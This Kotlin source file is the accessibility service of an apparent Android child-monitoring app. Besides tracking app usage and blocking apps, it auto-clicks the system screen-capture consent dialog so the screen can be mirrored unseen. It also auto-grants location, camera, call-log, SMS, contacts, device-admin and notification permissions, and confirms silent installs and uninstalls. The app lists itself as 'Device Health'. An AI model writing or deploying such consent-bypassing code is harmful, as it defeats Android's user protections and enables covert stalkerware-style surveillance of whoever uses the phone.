package com.familyguard.child.service

import android.accessibilityservice.AccessibilityService
import android.Manifest
import android.app.AppOpsManager
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.os.Process
import android.os.SystemClock
import android.provider.Settings
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import androidx.core.app.NotificationManagerCompat
import androidx.core.content.ContextCompat
import com.familyguard.child.BlockAction
import com.familyguard.child.RulesEngine
import com.familyguard.child.admin.AdminReceiver
import com.familyguard.child.data.Store
import com.familyguard.child.ui.BlockOverlay
import java.util.concurrent.ConcurrentHashMap

class EnforcementService : AccessibilityService() {

    private var prevPkg: String? = null
    private var prevTs = 0L

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        Store.accessibilityLostAt = 0L
        prevTs = System.currentTimeMillis()
        if (Store.usageDate == Store.today()) {
            minutesToday.putAll(Store.loadUsage())
        } else {
            Store.saveUsage(emptyMap(), Store.today())
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        val ev = event ?: return
        if (ev.eventType != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) return
        val pkg = ev.packageName?.toString() ?: return
        if (pkg == packageName) return

        // Reboot recovery: the system MediaProjection consent dialog just opened after
        // WE requested it (ConsentActivity arms the timestamp). Click "Start now"
        // automatically so mirroring works without touching the child phone.
        // Package is usually systemui, but some OEMs host the dialog elsewhere.
        if (pkg in PROJECTION_DIALOG_PKGS && isProjectionDialog(ev.className?.toString())) {
            maybeAutoConfirmProjection()
            return
        }

        // Wizard auto-grant: a permission step is armed (autoClickStep + deadline) —
        // click the matching system dialog buttons / toggles for it.
        if (Store.autoClickUntil > 0L && SystemClock.elapsedRealtime() <= Store.autoClickUntil) {
            if (pkg in ALLOW_PKGS) maybeAutoGrant()
            return
        }

        val now = System.currentTimeMillis()
        prevPkg?.let { prev ->
            if (prev != pkg) {
                val mins = ((now - prevTs) / 60000L).toInt()
                if (mins > 0) minutesToday.merge(prev, mins, Int::plus)
            }
        }
        prevPkg = pkg
        prevTs = now
        lastApp = pkg

        if (Store.today() != Store.usageDate) {
            minutesToday.clear()
            Store.saveUsage(emptyMap(), Store.today())
        }

        if (!Store.released) {
            when (val d = RulesEngine.decide(pkg)) {
                is BlockAction.APP_BLOCK ->
                    BlockOverlay.show(applicationContext, BlockOverlay.Reason.APP_BLOCK, "App blocked", d.label)
                is BlockAction.TIME_OVER ->
                    BlockOverlay.show(applicationContext, BlockOverlay.Reason.TIME_OVER, "Screen time over", "Daily limit reached")
                is BlockAction.BEDTIME ->
                    BlockOverlay.show(applicationContext, BlockOverlay.Reason.BEDTIME, "Bedtime", "Phone is locked until morning")
                is BlockAction.SCHEDULE ->
                    BlockOverlay.show(applicationContext, BlockOverlay.Reason.SCHEDULE, "Scheduled block", d.name)
                BlockAction.NONE -> BlockOverlay.hideIfAppBlock()
            }
        }
    }

    override fun onInterrupt() {}

    override fun onUnbind(intent: Intent?): Boolean {
        instance = null
        // Accessibility was turned off — record it so the SelfHeal watchdog can
        // raise the alarm (event to the parent + full-screen fix notification).
        Store.accessibilityLostAt = System.currentTimeMillis()
        return super.onUnbind(intent)
    }

    override fun onDestroy() {
        instance = null
        super.onDestroy()
    }

    companion object {
        @Volatile
        var lastApp = ""

        val minutesToday = ConcurrentHashMap<String, Int>()

        @Volatile
        var instance: EnforcementService? = null

        fun disableSelfSafe() {
            runCatching { instance?.disableSelf() }
        }

        fun persist(ctx: Context) {
            Store.saveUsage(minutesToday.toMap(), Store.today())
        }

        // ---- projection consent auto-confirm ----

        private val confirmHandler = Handler(Looper.getMainLooper())

        @Volatile
        private var confirmAttempts = 0

        /** Positive buttons we are allowed to click, exact lowercase match. */
        private val POSITIVE_ACTIONS = setOf(
            "start now", "start", "start recording", "start casting",
            "start screen capture", "start screen sharing", "start sharing",
            "share screen", "share entire screen", "share this screen", "share",
            "अभी शुरू करें", "शुरू करें", "अभी प्रारंभ करें", "प्रारंभ करें",
            "स्क्रीन साझा करें", "साझा करें", "शेयर करें"
        )

        /** Android 14+ chooser: make sure the whole screen is the selected option. */
        private val ENTIRE_SCREEN_LABELS = listOf("entire screen", "पूरी स्क्रीन", "पूरा स्क्रीन")

        private fun isProjectionDialog(className: String?): Boolean {
            if (className == null) return false
            val c = className.lowercase()
            // Broad match: OEMs rename the consent dialog class (MIUI/HyperOS, ColorOS,
            // One UI). Missing one meant the dialog sat on screen with no auto-click.
            return c.contains("mediaprojection") || c.contains("projection") ||
                c.contains("screencapture") || c.contains("screen_capture") ||
                c.contains("screenrecord") || c.contains("screen_record") ||
                c.contains("screencast") || c.contains("screen_cast") ||
                c.contains("castdialog") || c.contains("mirrordialog")
        }

        // ---- wizard auto-grant ----

        @Volatile
        private var grantAttempts = 0

        /** System packages whose windows may be auto-clicked while a step is armed. */
        val ALLOW_PKGS = setOf(
            "com.android.settings", "com.android.systemui", "android",
            "com.google.android.permissioncontroller", "com.android.permissioncontroller",
            "com.android.packageinstaller",
            // Installer/uninstaller dialogs (uninstall auto-confirm + silent update):
            // AOSP dialog com.android.packageinstaller me aata hai, lekin OEMs apna
            // installer host karte hain — bina inke uninstall/update dialog par
            // click kabhi nahi hota.
            "com.google.android.packageinstaller",
            "com.miui.packageinstaller", "com.miui.securitycenter",
            "com.samsung.android.packageinstaller"
        )

        /** Packages that may host the MediaProjection consent dialog. */
        private val PROJECTION_DIALOG_PKGS = ALLOW_PKGS + setOf(
            "com.miui.securitycenter", "com.miui.home",
            "com.coloros.safecenter", "com.oplus.safecenter",
            "com.samsung.android.permissioncontroller"
        )

        /** Exact lowercase button labels per armed step — nothing else is ever clicked. */
        val ALLOW_EXACT: Map<String, Set<String>> = mapOf(
            "loc" to setOf("allow all the time", "while using the app", "only this time", "allow"),
            "cam" to setOf("allow", "only this time"),
            "calls" to setOf("allow"),
            "battery" to setOf("allow"),
            "admin" to setOf(
                "activate", "activate device administrator",
                "इस ऐप्लिकेशन को चालू करें", "चालू करें", "सक्रिय करें"
            ),
            "notif" to setOf("allow", "अनुमति दें"),
            // Self-uninstall confirm dialog (Remove device / 18+ release):
            // AOSP: "Do you want to uninstall this app?" [OK], MIUI/Samsung apna
            // text use karte hain. Sirf release/uninstall armed hone par hi armed
            // window (120 s) me click hota hai.
            "uninstall" to setOf(
                "ok", "uninstall", "uninstall anyway", "uninstall for all users",
                "इस ऐप को अनइंस्टॉल करें", "अनइंस्टॉल करें", "अनइंस्टॉल"
            ),
            // Silent self-update: child app naya APK install karta hai — system
            // install confirm par khud "Install" click ho jata hai.
            "install" to setOf(
                "install", "install anyway", "इंस्टॉल करें", "इंस्टॉल करें।"
            )
        )
    }

    private fun maybeAutoConfirmProjection() {
        val requestedAt = Store.projectionRequestedAt
        if (requestedAt <= 0L || !Store.paired || Store.released) return
        val dt = SystemClock.elapsedRealtime() - requestedAt
        if (dt < 0L || dt > 60_000L) return
        if (confirmAttempts > 0) return // retry loop already running
        confirmAttempts = 1
        confirmHandler.postDelayed({ attemptConfirm(1) }, 350L)
    }

    private fun attemptConfirm(n: Int) {
        confirmAttempts = n
        val clicked = runCatching { projectionClickPass() }.getOrDefault(false)
        if (clicked) {
            Store.projectionRequestedAt = 0L
            confirmAttempts = 0
            return
        }
        val requestedAt = Store.projectionRequestedAt
        val stillFresh = requestedAt > 0L && SystemClock.elapsedRealtime() - requestedAt <= 60_000L
        // Cold devices can take 10+ s to actually render the dialog after a reboot —
        // keep retrying ~20 s (40 x 500 ms) before giving up.
        if (n < 40 && stillFresh) {
            confirmHandler.postDelayed({ attemptConfirm(n + 1) }, 500L)
        } else {
            confirmAttempts = 0
        }
    }

    /** One pass over the dialog: select "entire screen" if needed, then click the
     *  positive action button. Returns true once a button was clicked. */
    private fun projectionClickPass(): Boolean {
        val root = rootInActiveWindow ?: return false
        for (label in ENTIRE_SCREEN_LABELS) {
            for (n in root.findAccessibilityNodeInfosByText(label)) {
                if (n.isCheckable && !n.isSelected) clickDeep(n)
            }
        }
        val matches = mutableSetOf<AccessibilityNodeInfo>()
        for (needle in listOf("start", "share", "शुरू", "प्रारंभ", "साझा", "शेयर")) {
            matches.addAll(root.findAccessibilityNodeInfosByText(needle))
        }
        for (n in matches) {
            val text = (n.text ?: n.contentDescription)?.toString()?.trim()?.lowercase() ?: continue
            if (text in POSITIVE_ACTIONS && !n.isCheckable && clickDeep(n)) return true
        }
        return false
    }

    private fun clickDeep(node: AccessibilityNodeInfo): Boolean {
        var cur: AccessibilityNodeInfo? = node
        var hops = 0
        while (cur != null && hops < 4) {
            val target = cur
            if (target.isClickable) {
                return runCatching { target.performAction(AccessibilityNodeInfo.ACTION_CLICK) }.getOrDefault(false)
            }
            cur = target.parent
            hops++
        }
        return false
    }

    // ---- wizard auto-grant engine ----

    private fun maybeAutoGrant() {
        if (grantAttempts > 0) return // retry loop already running
        grantAttempts = 1
        confirmHandler.postDelayed({ attemptGrant(1) }, 350L)
    }

    private fun attemptGrant(n: Int) {
        val step = Store.autoClickStep
        if (step.isBlank() || SystemClock.elapsedRealtime() > Store.autoClickUntil) {
            grantAttempts = 0
            return
        }
        val finished = runCatching { autoGrantPass(step) }.getOrDefault(false)
        // Uninstall/install dialogs slow phones par bohot der baad dikhte hain —
        // armed window ~120 s hai, retry loop usse thoda aage tak chale.
        val maxTries = if (step == "uninstall" || step == "install") 300 else 60
        if (finished || n >= maxTries) {
            grantAttempts = 0
            return
        }
        grantAttempts = n + 1
        confirmHandler.postDelayed({ attemptGrant(n + 1) }, 450L)
    }

    /** One pass for the armed step. Returns true once the step's permission is ON. */
    private fun autoGrantPass(step: String): Boolean {
        val ctx = applicationContext
        if (stepDone(step, ctx)) return true
        return when (step) {
            "usage" -> clickAppRowToggle()
            "overlay" -> clickFirstUncheckedToggle()
            // Install-unknown-apps screen: per-app toggle list — humari row flip karo
            "unknown" -> clickAppRowToggle()
            else -> clickExact(step)
        }
    }

    private fun stepDone(step: String, ctx: Context): Boolean = runCatching {
        when (step) {
            "loc" -> ContextCompat.checkSelfPermission(ctx, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
                ContextCompat.checkSelfPermission(ctx, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
            "cam" -> ContextCompat.checkSelfPermission(ctx, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
            "calls" -> ContextCompat.checkSelfPermission(ctx, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED ||
                ContextCompat.checkSelfPermission(ctx, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED ||
                ContextCompat.checkSelfPermission(ctx, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED
            "battery" -> (ctx.getSystemService(Context.POWER_SERVICE) as PowerManager)
                .isIgnoringBatteryOptimizations(ctx.packageName)
            "admin" -> (ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager)
                .isAdminActive(ComponentName(ctx, AdminReceiver::class.java))
            "usage" -> {
                val appOps = ctx.getSystemService(Context.APP_OPS_SERVICE) as AppOpsManager
                appOps.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, Process.myUid(), ctx.packageName) == AppOpsManager.MODE_ALLOWED
            }
            "overlay" -> Settings.canDrawOverlays(ctx)
            "notif" -> NotificationManagerCompat.getEnabledListenerPackages(ctx).contains(ctx.packageName)
            // Install-unknown-apps: silent APK update ke liye zaroori
            "unknown" -> runCatching { ctx.packageManager.canRequestPackageInstalls() }.getOrDefault(false)
            // install/uninstall steps kabhi "done" nahi hote — click hi success hai
            else -> false
        }
    }.getOrDefault(false)

    /** Click an exact-label button (Allow / Activate / …) on the current window. */
    private fun clickExact(step: String): Boolean {
        val root = rootInActiveWindow ?: return false
        val wanted = ALLOW_EXACT[step] ?: return false
        for (needle in wanted) {
            for (n in root.findAccessibilityNodeInfosByText(needle)) {
                val text = (n.text ?: n.contentDescription)?.toString()?.trim()?.lowercase() ?: continue
                if (text in wanted && !n.isCheckable && clickDeep(n)) return true
            }
        }
        // Hindi "While using the app" is a long string — safe contains rule.
        if (step == "loc") {
            for (n in root.findAccessibilityNodeInfosByText("उपयोग करते समय")) {
                if (!n.isCheckable && clickDeep(n)) return true
            }
        }
        return false
    }

    /** Usage/notification lists: find our app's row ("Device Health") and flip its toggle. */
    private fun clickAppRowToggle(): Boolean {
        val root = rootInActiveWindow ?: return false
        for (label in listOf("device health", packageName)) {
            for (t in root.findAccessibilityNodeInfosByText(label)) {
                var row: AccessibilityNodeInfo? = t
                var hops = 0
                while (row != null && hops < 5) {
                    val current = row
                    val sw = findCheckable(current, 24)
                    if (sw != null) {
                        return if (!sw.isChecked) {
                            sw.performAction(AccessibilityNodeInfo.ACTION_CLICK) || clickDeep(sw)
                        } else true
                    }
                    row = current.parent
                    hops++
                }
            }
        }
        return false
    }

    /** Overlay single-app screen: flip the one toggle that is off. */
    private fun clickFirstUncheckedToggle(): Boolean {
        val root = rootInActiveWindow ?: return false
        val sw = findCheckable(root, 40) ?: return false
        return if (!sw.isChecked) {
            sw.performAction(AccessibilityNodeInfo.ACTION_CLICK) || clickDeep(sw)
        } else true
    }

    private fun findCheckable(node: AccessibilityNodeInfo, budget: Int): AccessibilityNodeInfo? {
        if (node.isCheckable) return node
        if (budget <= 0) return null
        for (i in 0 until node.childCount) {
            val child = runCatching { node.getChild(i) }.getOrNull() ?: continue
            val found = findCheckable(child, budget - 1)
            if (found != null) return found
        }
        return null
    }
}
